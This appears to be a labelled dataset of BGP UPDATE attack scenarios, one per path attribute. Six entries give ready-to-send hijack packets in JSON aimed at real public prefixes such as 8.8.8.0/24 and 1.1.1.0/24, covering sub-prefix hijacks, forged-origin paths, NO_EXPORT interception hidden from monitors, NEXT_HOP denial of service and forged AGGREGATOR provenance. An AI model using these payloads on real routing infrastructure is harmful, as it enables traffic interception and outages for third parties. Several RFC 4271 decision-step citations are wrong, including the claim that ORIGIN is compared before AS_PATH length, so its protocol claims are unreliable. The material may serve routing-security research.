## 1) UPDATE - NLRI
**Message:** UPDATE
**Target Attribute's path:** NLRI
**Threat Model:**
- **Attack Assumption:**
In the target inter-domain routing infrastructure, autonomous systems (ASes) exchange reachability information via BGP-4 (RFC 4271).
We assume: (i) the attacker operates a legitimate AS (AS 666) with an established eBGP peering session to a transit provider (AS 3356); (ii) the victim AS (AS 15169) announces the prefix 8.8.8.0/24; (iii) the attacker can craft BGP UPDATE messages with arbitrary NLRI (Network Layer Reachability Information) fields; (iv) the transit provider and downstream ASes apply standard longest-prefix-match forwarding; and (v) the victim's prefix is not protected by RPKI ROA with maxLength restrictions, or the transit provider does not enforce ROV.
- **Attacker Capability:**
The attacker is restricted to injecting BGP UPDATE messages on a single established eBGP session.

**Attack Procedure:**
The attacker crafts a BGP UPDATE message performing a sub-prefix hijack — the most fundamental and effective BGP hijack technique (Lychev et al., IEEE S&P 2013). Instead of announcing the victim's exact prefix 8.8.8.0/24, the attacker announces two more-specific sub-prefixes: 8.8.8.0/25 and 8.8.8.128/25. The AS_PATH is set to [666] (the attacker as origin, a plain origin hijack) and ORIGIN is set to IGP (0). The NEXT_HOP is set to the attacker's peering address 198.51.100.1.

Per RFC 4271 Section 9.1, BGP routers perform longest-prefix-match forwarding: a /25 route is always preferred over a /24 route for destinations within the /25 range, regardless of any other path attributes (AS_PATH length, LOCAL_PREF, MED, etc.). This means the attacker's sub-prefix announcements will be preferred by every router in the Internet's default-free zone that receives them, achieving near-global traffic interception. Unlike exact-prefix hijacks, sub-prefix hijacks cannot be defeated by AS_PATH-based defenses or LOCAL_PREF tuning. The only effective defense is RPKI ROA with maxLength set to /24 (preventing validation of /25 announcements) combined with ROV enforcement. The PoC is successful if traffic destined for addresses within 8.8.8.0/24 is globally redirected to the attacker's AS.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 63
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [666]
        }
      ]
    },
    {
      "attr_flags": "0x40",
      "attr_type": 3,
      "attr_name": "NEXT_HOP",
      "attr_value": "198.51.100.1"
    }
  ],
  "nlri": ["8.8.8.0/25", "8.8.8.128/25"]
}

**Classification:**
ATTACK


## 2) UPDATE - AS_PATH
**Message:** UPDATE
**Target Attribute's path:** AS_PATH
**Threat Model:**
- **Attack Assumption:**
In the target inter-domain routing infrastructure, autonomous systems (ASes) exchange reachability information via the Border Gateway Protocol (BGP-4, RFC 4271) over established TCP sessions between border routers.
We assume: (i) the attacker operates a legitimate AS (AS 666) that has an established eBGP peering session with a neighboring transit provider AS (AS 174); (ii) the attacker's border router can craft and inject arbitrary BGP UPDATE messages into this established session; (iii) the victim AS (AS 15169, operating prefix 8.8.8.0/24) does not deploy RPKI Route Origin Validation (ROV) or the neighboring AS does not enforce ROV filtering; (iv) the transit provider AS applies standard BGP best-path selection (preferring shorter AS_PATH length) and propagates received routes to its peers and customers; and (v) the attacker has identified the victim's prefix and origin AS through public BGP route collectors (e.g., RIPE RIS, RouteViews).
- **Attacker Capability:**
The attacker is restricted to injecting BGP UPDATE messages on a single established eBGP session.

**Attack Procedure:**
The attacker crafts a BGP UPDATE message announcing the victim's prefix 8.8.8.0/24 with a forged AS_PATH. Specifically, the attacker constructs the AS_PATH attribute as an AS_SEQUENCE containing [666, 15169], where AS 15169 is the legitimate origin AS for the prefix. This is a forged-origin prefix hijack (Ballani et al., SIGCOMM 2007): by placing the legitimate origin AS at the end of the path, the announcement appears to be a valid route learned transitively through AS 666, evading origin-based filtering such as RPKI ROV. The ORIGIN attribute is set to IGP (0) and NEXT_HOP is set to the attacker's peering address 198.51.100.1. The attacker sends this UPDATE to the transit provider AS 174.

After AS 174 processes the UPDATE, it compares the forged route (AS_PATH length 2: [174, 666, 15169]) against the legitimate route (which may have a longer AS_PATH through multiple transit hops). If the forged route has a shorter or equal AS_PATH length, AS 174's best-path selection algorithm (RFC 4271 Section 9.1.2.2, step c) will prefer the attacker's route. AS 174 then propagates this route to its peers and customers, causing a portion of Internet traffic destined for 8.8.8.0/24 to be redirected to the attacker's AS 666. The attacker can then intercept, inspect, or blackhole the traffic. The PoC is successful if traffic from ASes that receive the forged route is redirected to the attacker's network instead of the legitimate destination.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 67
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [666, 15169]
        }
      ]
    },
    {
      "attr_flags": "0x40",
      "attr_type": 3,
      "attr_name": "NEXT_HOP",
      "attr_value": "198.51.100.1"
    }
  ],
  "nlri": ["8.8.8.0/24"]
}

**Classification:**
ATTACK


## 3) UPDATE - ORIGIN
**Message:** UPDATE
**Target Attribute's path:** ORIGIN
**Threat Model:**
- **Attack Assumption:**
In the target inter-domain routing infrastructure, autonomous systems (ASes) exchange reachability information via the Border Gateway Protocol (BGP-4, RFC 4271) over established TCP sessions between border routers.
We assume: (i) the attacker operates a legitimate AS (AS 666) that has an established eBGP peering session with a neighboring transit provider AS (AS 3356); (ii) the attacker's border router can craft and inject arbitrary BGP UPDATE messages into this established session; (iii) the victim AS (AS 13335, operating prefix 1.1.1.0/24) relies on standard BGP best-path selection without additional route validation; (iv) the transit provider AS propagates received routes to its peers and customers following standard BGP decision process; and (v) the attacker has identified the victim's prefix through public BGP route collectors.
- **Attacker Capability:**
The attacker is restricted to injecting BGP UPDATE messages on a single established eBGP session.

**Attack Procedure:**
The attacker crafts a BGP UPDATE message announcing the victim's prefix 1.1.1.0/24 with a forged-origin AS_PATH [666, 13335] and sets the ORIGIN attribute to IGP (0). Per RFC 4271 Section 9.1.2.2 step (a), the BGP best-path selection algorithm compares ORIGIN attributes before AS_PATH length: IGP < EGP < INCOMPLETE. If the legitimate route for 1.1.1.0/24 was learned via redistribution and carries ORIGIN INCOMPLETE (2), the attacker's route with ORIGIN IGP (0) will be preferred regardless of AS_PATH length. This attack exploits the ORIGIN attribute's priority in the BGP decision process (Goldberg et al., "Why Is It Taking So Long to Secure Internet Routing?", CACM 2014). The attacker sets NEXT_HOP to 198.51.100.1.

After the transit provider processes the UPDATE, if the legitimate route carries a less-preferred ORIGIN value, the forged route wins the best-path selection. The transit provider propagates the attacker's route, causing traffic destined for 1.1.1.0/24 to be redirected to AS 666. The PoC is successful if the attacker's route is selected as the best path due to the ORIGIN attribute preference.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 67
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [666, 13335]
        }
      ]
    },
    {
      "attr_flags": "0x40",
      "attr_type": 3,
      "attr_name": "NEXT_HOP",
      "attr_value": "198.51.100.1"
    }
  ],
  "nlri": ["1.1.1.0/24"]
}

**Classification:**
ATTACK


## 4) UPDATE - COMMUNITIES
**Message:** UPDATE
**Target Attribute's path:** COMMUNITIES
**Threat Model:**
- **Attack Assumption:**
In the target inter-domain routing infrastructure, autonomous systems (ASes) exchange reachability information via BGP-4 (RFC 4271) with BGP Communities support (RFC 1997).
We assume: (i) the attacker operates a legitimate AS (AS 666) with an established eBGP peering session to a Tier-1 transit provider (AS 174); (ii) the transit provider implements action communities that allow customers to control route propagation — specifically, the provider honors the well-known NO_EXPORT community (RFC 1997) and provider-specific blackhole communities; (iii) the attacker can craft BGP UPDATE messages with arbitrary community values; (iv) the victim AS (AS 15169) announces prefix 8.8.8.0/24 through multiple upstream providers; and (v) the transit provider does not scrub or filter community attributes received from eBGP peers (a common operational practice documented by Streibelt et al., IMC 2018).
- **Attacker Capability:**
The attacker is restricted to injecting BGP UPDATE messages on a single established eBGP session.

**Attack Procedure:**
The attacker crafts a BGP UPDATE message performing a SICO (Surgical Interception using COmmunities) attack (Birge-Lee et al., CCS 2019). The attacker announces the victim's prefix 8.8.8.0/24 with a forged-origin AS_PATH [666, 15169] and attaches the well-known NO_EXPORT community (0xFFFFFF01). Per RFC 1997 Section 3, a route carrying NO_EXPORT "MUST NOT be advertised outside a BGP confederation boundary." This means AS 174 will install the attacker's route locally but will NOT propagate it to BGP route collectors or monitoring systems (RIPE RIS, RouteViews), making the hijack invisible to all public monitoring infrastructure.

Simultaneously, the attacker uses the NO_EXPORT community to ensure the hijack is surgically scoped: only AS 174 and its direct customers are affected, while the rest of the Internet continues to route via the legitimate path. This allows the attacker to intercept traffic from AS 174's customer cone while maintaining a valid return path to the victim through other providers. The attacker forwards intercepted traffic to the victim via an unaffected path, completing a man-in-the-middle interception. The PoC is successful if traffic from AS 174's customer cone is redirected through the attacker's network without triggering alerts on public BGP monitoring systems.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 79
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [666, 15169]
        }
      ]
    },
    {
      "attr_flags": "0x40",
      "attr_type": 3,
      "attr_name": "NEXT_HOP",
      "attr_value": "198.51.100.1"
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 8,
      "attr_name": "COMMUNITIES",
      "attr_value": ["no-export"]
    }
  ],
  "nlri": ["8.8.8.0/24"]
}

**Classification:**
ATTACK


## 5) UPDATE - NEXT_HOP
**Message:** UPDATE
**Target Attribute's path:** NEXT_HOP
**Threat Model:**
- **Attack Assumption:**
In the target inter-domain routing infrastructure, autonomous systems (ASes) exchange reachability information via BGP-4 (RFC 4271) over established TCP sessions.
We assume: (i) the attacker operates a legitimate AS (AS 666) with an established eBGP peering session at an Internet Exchange Point (IXP) shared with the victim AS (AS 15169) and other participant ASes; (ii) the IXP uses a shared Layer-2 fabric (e.g., VLAN) where all participants can reach each other's peering IP addresses; (iii) the attacker can craft BGP UPDATE messages with arbitrary NEXT_HOP values, including IP addresses belonging to other IXP participants; (iv) the IXP route server does not enforce NEXT_HOP validation (RFC 4271 Section 5.1.3 recommends but does not mandate strict NEXT_HOP checking); and (v) the attacker has identified the victim's peering IP address at the IXP through public PeeringDB records or IXP looking glass services.
- **Attacker Capability:**
The attacker is restricted to injecting BGP UPDATE messages on a single established eBGP session at the IXP.

**Attack Procedure:**
The attacker crafts a BGP UPDATE message announcing prefix 203.0.113.0/24 (a prefix the attacker legitimately originates) but sets the NEXT_HOP attribute to 192.0.2.10 — the victim AS 15169's peering IP address at the IXP — instead of the attacker's own peering address. Per RFC 4271 Section 5.1.3, the NEXT_HOP attribute defines the IP address of the border router that should be used as the next hop to the destinations listed in the NLRI field. The AS_PATH is set to [666] (the attacker's own AS, making this a legitimate origin announcement) and ORIGIN is set to IGP (0).

When other IXP participants (or the route server) receive this UPDATE, they install a route for 203.0.113.0/24 with the NEXT_HOP pointing to the victim's router (192.0.2.10) rather than the attacker's router. This causes all traffic destined for 203.0.113.0/24 from IXP participants to be forwarded to the victim's router, which has no route for this prefix and will either drop the traffic or generate ICMP unreachable messages. This constitutes a reflected denial-of-service attack against the victim's peering router, consuming its forwarding resources and potentially its bandwidth. The PoC is successful if traffic for 203.0.113.0/24 is forwarded to the victim's peering IP instead of the attacker's router.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 59
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [666]
        }
      ]
    },
    {
      "attr_flags": "0x40",
      "attr_type": 3,
      "attr_name": "NEXT_HOP",
      "attr_value": "192.0.2.10"
    }
  ],
  "nlri": ["203.0.113.0/24"]
}

**Classification:**
ATTACK


## 6) UPDATE - AGGREGATOR
**Message:** UPDATE
**Target Attribute's path:** AGGREGATOR
**Threat Model:**
- **Attack Assumption:**
In the target inter-domain routing infrastructure, autonomous systems (ASes) exchange reachability information via BGP-4 (RFC 4271).
We assume: (i) the attacker operates a legitimate AS (AS 666) with an established eBGP peering session to a transit provider (AS 174); (ii) the attacker can craft BGP UPDATE messages with arbitrary path attributes including AGGREGATOR (type 7) and ATOMIC_AGGREGATE (type 6); (iii) the victim AS (AS 15169) announces prefix 8.8.0.0/21 as an aggregate of more-specific prefixes; (iv) downstream ASes and route monitoring systems use the AGGREGATOR attribute for provenance tracking and anomaly detection; and (v) the transit provider does not validate the AGGREGATOR attribute contents against the actual AS_PATH.
- **Attacker Capability:**
The attacker is restricted to injecting BGP UPDATE messages on a single established eBGP session.

**Attack Procedure:**
The attacker crafts a BGP UPDATE message announcing the aggregate prefix 8.8.0.0/21 with the ATOMIC_AGGREGATE attribute set (indicating route aggregation has occurred) and the AGGREGATOR attribute set to {AS: 15169, IP: 216.239.32.1} — the victim's AS number and a plausible router IP address. The AS_PATH is set to [666, 15169] (forged-origin). Per RFC 4271 Section 5.1.7, the AGGREGATOR attribute contains the AS number and IP address of the router that performed the aggregation. By forging this attribute, the attacker makes the route appear as if it was legitimately aggregated by the victim AS, adding a layer of plausibility to the hijack that can deceive both automated monitoring systems and human operators performing manual route analysis.

This attack is particularly insidious because the AGGREGATOR attribute is informational and is not used in the BGP decision process, so it does not affect route selection — but it provides false provenance information that can mislead incident response. The PoC is successful if the forged aggregate route is accepted and propagated with the spoofed AGGREGATOR attribute intact, providing false attribution.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 75
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [666, 15169]
        }
      ]
    },
    {
      "attr_flags": "0x40",
      "attr_type": 3,
      "attr_name": "NEXT_HOP",
      "attr_value": "198.51.100.1"
    },
    {
      "attr_flags": "0x40",
      "attr_type": 6,
      "attr_name": "ATOMIC_AGGREGATE",
      "attr_value": null
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 7,
      "attr_name": "AGGREGATOR",
      "attr_value": {
        "aggregator_as": 15169,
        "aggregator_ip": "216.239.32.1"
      }
    }
  ],
  "nlri": ["8.8.0.0/21"]
}

**Classification:**
ATTACK


## 7) UPDATE - MULTI_EXIT_DISC
**Message:** UPDATE
**Target Attribute's path:** MULTI_EXIT_DISC
**Threat Model:**
- **Attack Assumption:**
In the target inter-domain routing infrastructure, autonomous systems (ASes) exchange reachability information via BGP-4 (RFC 4271).
We assume: (i) the attacker operates a legitimate AS (AS 666) with an established eBGP peering session to a neighboring AS (AS 174); (ii) the attacker can craft BGP UPDATE messages with arbitrary MULTI_EXIT_DISC (MED) attribute values; (iii) the attacker announces its own legitimately originated prefix 198.51.100.0/24; (iv) the neighboring AS (AS 174) has multiple peering links with the attacker's AS; and (v) the neighboring AS applies standard BGP best-path selection including MED comparison.
- **Attacker Capability:**
The attacker is restricted to injecting BGP UPDATE messages on a single established eBGP session.
**Security Analysis:**
The MULTI_EXIT_DISC (MED) attribute (RFC 4271 Section 5.1.4) is a non-transitive optional attribute used to discriminate among multiple exit points to a neighboring AS. Per RFC 4271 Section 9.1.2.2 step (d), MED is compared only among routes received from the same neighboring AS (unless "always-compare-med" is configured, which is non-default on most implementations). Critically, MED is non-transitive: per RFC 4271 Section 5.1.4, "a BGP speaker MUST implement a mechanism to remove MED attributes from routes received from external peers before re-advertising them to other external peers." This means the attacker's MED value is stripped at the AS boundary and cannot influence routing decisions beyond the immediate neighbor AS 174. Setting MED to 0 (lowest, most preferred) or 4294967295 (highest, least preferred) only affects which of AS 174's peering links with AS 666 is preferred for traffic toward 198.51.100.0/24 — it does not redirect traffic belonging to other ASes, does not cause traffic interception, and does not affect the global routing table. The MED attribute operates strictly within the scope of the bilateral peering relationship and cannot be weaponized for prefix hijacking, traffic interception, or denial of service against third parties.

**Classification:**
SAFE


## 8) UPDATE - LOCAL_PREF
**Message:** UPDATE
**Target Attribute's path:** LOCAL_PREF
**Threat Model:**
- **Attack Assumption:**
In the target inter-domain routing infrastructure, autonomous systems (ASes) exchange reachability information via BGP-4 (RFC 4271).
We assume: (i) the attacker operates a legitimate AS (AS 666) with an established eBGP peering session to a neighboring transit provider AS (AS 3356); (ii) the attacker can craft BGP UPDATE messages with arbitrary path attributes; (iii) the attacker includes a LOCAL_PREF attribute (type 5) with value 200 in an eBGP UPDATE message sent to AS 3356; and (iv) the transit provider AS implements standard BGP processing per RFC 4271.
- **Attacker Capability:**
The attacker is restricted to injecting BGP UPDATE messages on a single established eBGP session.
**Security Analysis:**
The LOCAL_PREF attribute (RFC 4271 Section 5.1.5) is a well-known discretionary attribute that is only used in iBGP (internal BGP) to communicate the degree of preference for a route within an AS. Per RFC 4271 Section 5.1.5, "A BGP speaker MUST NOT include this attribute in UPDATE messages it sends to external peers" and "If it is contained in an UPDATE message that is received from an external peer, then this attribute MUST be ignored by the receiving speaker." Compliant BGP implementations (FRRouting, BIRD, OpenBGPd, Cisco IOS, Junos) silently discard the LOCAL_PREF attribute from eBGP-received routes and replace it with the locally configured default (typically 100). Therefore, even if the attacker sets LOCAL_PREF to an extremely high value (e.g., 4294967295), the receiving eBGP peer will ignore it entirely. The attacker cannot influence the transit provider's internal route preference through this attribute. LOCAL_PREF manipulation is only a threat in iBGP scenarios (e.g., a compromised router within the same AS), which is outside the assumed attacker model of an external eBGP peer.

**Classification:**
SAFE
